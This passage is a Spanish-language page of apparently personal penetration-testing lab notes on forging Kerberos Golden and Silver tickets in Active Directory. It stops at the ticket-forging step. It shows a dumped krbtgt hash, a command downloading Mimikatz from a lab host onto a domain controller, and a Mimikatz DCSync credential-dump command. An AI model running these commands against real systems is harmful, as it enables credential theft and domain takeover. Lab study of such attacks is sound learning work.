@@ -1,0 +1,1820 @@
+
+<!doctype html>
+<html lang="es" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../tipos-de-tickets-kerberos/">
+      
+      
+        <link rel="next" href="../kerberos-ataques/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/lucifer.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>🎟️ Creación de Tickets (Golden y Silver) - Bitácora de javik</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../estilos/gruvbox.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#creacion-y-forja-de-tickets-golden-ticket-y-silver-ticket" class="md-skip">
+          Saltar a contenido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabecera">
+    <a href="../.." title="Bitácora de javik" class="md-header__button md-logo" aria-label="Bitácora de javik" data-md-component="logo">
+      
+  <img src="../../assets/lucifer.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Bitácora de javik
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              🎟️ Creación de Tickets (Golden y Silver)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Buscar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando búsqueda
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Bitácora de javik" class="md-nav__button md-logo" aria-label="Bitácora de javik" data-md-component="logo">
+      
+  <img src="../../assets/lucifer.png" alt="logo">
+
+    </a>
+    Bitácora de javik
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎯 Bitácora de javik
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../certificaciones/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏆 CERTIFICACIONES
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../metodologia-ad/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🕸️ METODOLOGÍA AD
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mi-entorno/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🖥️ MI ENTORNO
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../maquinas/htb/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    💀 MÁQUINAS HTB
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    💀 MÁQUINAS HTB
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/administrator/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    💻 Administrator
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/babytwo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🛡️ BabyTwo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/delegate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔑 Delegate
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/tombwatcher/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ⏳ TombWatcher
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/escapetwo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🚪 EscapeTwo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/breach/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ⚡ Breach
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/media/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎬 Media
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/authority/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏛️ Authority
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/sendai/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏢 Sendai
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/voleur/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🦊 Voleur
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../herramientas/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🛠️ HERRAMIENTAS
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_6" id="__nav_6_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🛠️ HERRAMIENTAS
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../herramientas/nxc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ⚡ NetExec (NXC)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../herramientas/sliver-c2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🗡️ Sliver C2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../herramientas/seimpersonate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎭 SeImpersonatePrivilege
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../herramientas/mssql/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🗄️ Enumeración MSSQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../herramientas/chisel-pivoting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔌 Chisel & Pivoting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MIS NOTAS
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_7" id="__nav_7_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    MIS NOTAS
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../configuracion-ad-basico/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏰 Configuración de AD Básico
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ataques-adcs-esc1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📜 Abuso de AD CS (ESC1)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../como-funciona-kerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🛡️ ¿Cómo Funciona Kerberos?
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tipos-de-tickets-kerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎫 Tipos de Tickets Kerberos
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎟️ Creación de Tickets (Golden y Silver)
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎟️ Creación de Tickets (Golden y Silver)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Tabla de contenidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#creacion-de-golden-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Creación de Golden Ticket
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Creación de Golden Ticket">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-extraccion-del-hash-de-krbtgt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Extracción del Hash de krbtgt
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-transferencia-y-ejecucion-de-mimikatz" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Transferencia y Ejecución de Mimikatz
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-forja-del-golden-ticket-e-inyeccion-pass-the-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Forja del Golden Ticket e Inyección (Pass The Ticket)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Forja del Golden Ticket e Inyección (Pass The Ticket)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#que-hace-este-comando-desglose-de-parametros" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ¿Qué hace este comando? (Desglose de parámetros)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-uso-del-golden-ticket-desde-linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Uso del Golden Ticket desde Linux
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Uso del Golden Ticket desde Linux">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#por-que-es-tan-util-forjar-un-golden-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ¿Por qué es tan útil forjar un Golden Ticket?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#por-que-usar-wmiexecpy-en-lugar-de-evil-winrm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ¿Por qué usar wmiexec.py en lugar de evil-winrm?
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#creacion-de-silver-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Creación de Silver Ticket
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Creación de Silver Ticket">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-extraccion-del-hash-de-la-cuenta-de-maquina" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Extracción del Hash de la Cuenta de Máquina
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-forja-del-silver-ticket-con-ticketerpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Forja del Silver Ticket con ticketer.py
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Forja del Silver Ticket con ticketer.py">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#desglose-del-comando" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Desglose del comando:
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-conexion-y-acceso-con-el-silver-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Conexión y Acceso con el Silver Ticket
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../kerberos-ataques/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔥 Ataques Kerberos (AS-REP Roasting)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Tabla de contenidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#creacion-de-golden-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Creación de Golden Ticket
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Creación de Golden Ticket">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-extraccion-del-hash-de-krbtgt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Extracción del Hash de krbtgt
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-transferencia-y-ejecucion-de-mimikatz" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Transferencia y Ejecución de Mimikatz
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-forja-del-golden-ticket-e-inyeccion-pass-the-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Forja del Golden Ticket e Inyección (Pass The Ticket)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Forja del Golden Ticket e Inyección (Pass The Ticket)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#que-hace-este-comando-desglose-de-parametros" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ¿Qué hace este comando? (Desglose de parámetros)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-uso-del-golden-ticket-desde-linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Uso del Golden Ticket desde Linux
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Uso del Golden Ticket desde Linux">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#por-que-es-tan-util-forjar-un-golden-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ¿Por qué es tan útil forjar un Golden Ticket?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#por-que-usar-wmiexecpy-en-lugar-de-evil-winrm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ¿Por qué usar wmiexec.py en lugar de evil-winrm?
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#creacion-de-silver-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Creación de Silver Ticket
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Creación de Silver Ticket">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-extraccion-del-hash-de-la-cuenta-de-maquina" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Extracción del Hash de la Cuenta de Máquina
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-forja-del-silver-ticket-con-ticketerpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Forja del Silver Ticket con ticketer.py
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Forja del Silver Ticket con ticketer.py">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#desglose-del-comando" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Desglose del comando:
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-conexion-y-acceso-con-el-silver-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Conexión y Acceso con el Silver Ticket
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="creacion-y-forja-de-tickets-golden-ticket-y-silver-ticket">Creación y Forja de Tickets: Golden Ticket y Silver Ticket<a class="headerlink" href="#creacion-y-forja-de-tickets-golden-ticket-y-silver-ticket" title="Permanent link">&para;</a></h1>
+<p>Notas prácticas de laboratorio sobre la <strong>forja de tickets Kerberos</strong> en Active Directory: extracción de hashes con Mimikatz y Secretsdump, generación de <strong>Golden Tickets</strong> y <strong>Silver Tickets</strong>, inyección en memoria (Pass-the-Ticket) y ejecución remota con <code>wmiexec.py</code>.</p>
+<hr />
+<h2 id="creacion-de-golden-ticket">Creación de Golden Ticket<a class="headerlink" href="#creacion-de-golden-ticket" title="Permanent link">&para;</a></h2>
+<p>Un <strong>Golden Ticket</strong> es un TGT forjado con el hash de la cuenta <code>krbtgt</code> que otorga acceso ilimitado como administrador a cualquier servicio del dominio.</p>
+<h3 id="1-extraccion-del-hash-de-krbtgt">1. Extracción del Hash de <code>krbtgt</code><a class="headerlink" href="#1-extraccion-del-hash-de-krbtgt" title="Permanent link">&para;</a></h3>
+<p>Obtenemos el hash NTLM de la cuenta <code>krbtgt</code> del dominio:</p>
+<p><img alt="Extracción hash krbtgt" src="../assets/Pasted%20image%2020261011200417.png" /></p>
+<div class="highlight"><pre><span></span><code>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1ae48c342566ead9aed8411485671910:::
+</code></pre></div>
+<blockquote>
+<p>[!NOTE]
+Identificamos que pertenece a <code>krbtgt</code> por su <strong>RID 502</strong>, el identificador numérico fijo que Windows asigna siempre a esta cuenta (<code>500 = Administrator</code>, <code>501 = Guest</code>, <code>502 = krbtgt</code>).</p>
+</blockquote>
+<p>Obtenemos el <strong>SID del dominio</strong>:</p>
+<div class="highlight"><pre><span></span><code>S-1-5-21-2202691511-3005246676-1411338595
+</code></pre></div>
+<hr />
+<h3 id="2-transferencia-y-ejecucion-de-mimikatz">2. Transferencia y Ejecución de Mimikatz<a class="headerlink" href="#2-transferencia-y-ejecucion-de-mimikatz" title="Permanent link">&para;</a></h3>
+<p>Descargamos Mimikatz en la máquina del Controlador de Dominio:</p>
+<p><img alt="Descarga Mimikatz" src="../assets/Pasted%20image%2020261011203850.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">"http://192.168.100.139/mimikatz.exe"</span> <span class="n">-OutFile</span> <span class="s2">"C:\Users\Administrator\Desktop\mimikatz.exe"</span>
+</code></pre></div>
+<p>Ejecutamos <code>dcsync</code> localmente con Mimikatz para verificar los datos de <code>krbtgt</code>:</p>
+<div class="highlight"><pre><span></span><code>.\mimikatz.exe "lsadump::dcsync /user:krbtgt" "exit"
+</code></pre></div>
+<p><img alt="Mimikatz DCSync" src="../assets/Pasted%20image%2020261011204947.png" /></p>
+<blockquote>
+<p>[!INFO]
+Es básicamente lo mismo que hace <code>secretsdump.py</code> desde Linux, pero ejecutado desde adentro del DC con Mimikatz directamente contra el proceso LSASS.</p>
+</blockquote>
+<hr />
+<h3 id="3-forja-del-golden-ticket-e-inyeccion-pass-the-ticket">3. Forja del Golden Ticket e Inyección (Pass The Ticket)<a class="headerlink" href="#3-forja-del-golden-ticket-e-inyeccion-pass-the-ticket" title="Permanent link">&para;</a></h3>
+<p>Forjamos el ticket e inyectamos directamente en la sesión actual:</p>
